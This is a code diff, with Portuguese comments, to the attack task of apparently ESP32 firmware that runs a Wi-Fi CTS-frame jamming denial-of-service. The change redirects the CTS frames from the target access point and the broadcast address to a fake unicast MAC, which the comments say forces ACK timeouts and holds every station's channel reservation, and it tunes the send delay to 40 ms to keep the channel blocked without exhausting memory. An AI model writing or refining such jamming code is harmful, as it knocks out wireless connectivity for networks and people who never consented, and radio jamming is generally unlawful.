@@ -149,22 +149,19 @@ void attackTask(void *parameter) {
           esp_wifi_set_channel(canal_alvo, WIFI_SECOND_CHAN_NONE);
         }
 
-        static const uint8_t broadcast_mac[] = {0xFF, 0xFF, 0xFF,
-                                                0xFF, 0xFF, 0xFF};
+        // CTS Jamming efetivo com frames nativos 0xC4
+        // Enviamos para um MAC unicast falso para forçar o ACK timeout e atualizar o NAV de todos.
+        static const uint8_t fake_unicast_mac[] = {0x02, 0x11, 0x22, 0x33, 0x44, 0x55};
 
-        // Envia APENAS 1 par por ciclo. Cada CTS reserva 32,7ms do canal.
-        // Um delay de 25-30ms mantém o canal ocupado e, crucialmente, 
-        // permite que o Driver Wi-Fi esvazie a fila de TX, evitando o Watchdog.
-        wsl_bypasser_send_cts_frame(apRecordSelecionado.bssid);
-        ctsCounter++;
-
-        wsl_bypasser_send_cts_frame(broadcast_mac);
+        wsl_bypasser_send_cts_frame(fake_unicast_mac);
         ctsCounter++;
 
         xSemaphoreGive(wifiMutex);
         
-        // Delay que evita saturar a fila (WDT Reset) e ao mesmo tempo mantém o DoS
-        vTaskDelay(pdMS_TO_TICKS(25));
+        // O frame CTS real exigirá retries do ESP32, esgotando a fila TX se formos muito rápidos.
+        // O delay de 40ms é o "sweet spot": rápido o suficiente para travar o canal,
+        // mas lento o suficiente para que o lmac.c não gere vazamento de memória (ESP_ERR_NO_MEM).
+        vTaskDelay(pdMS_TO_TICKS(40));
       } else {
         vTaskDelay(pdMS_TO_TICKS(10));
       }
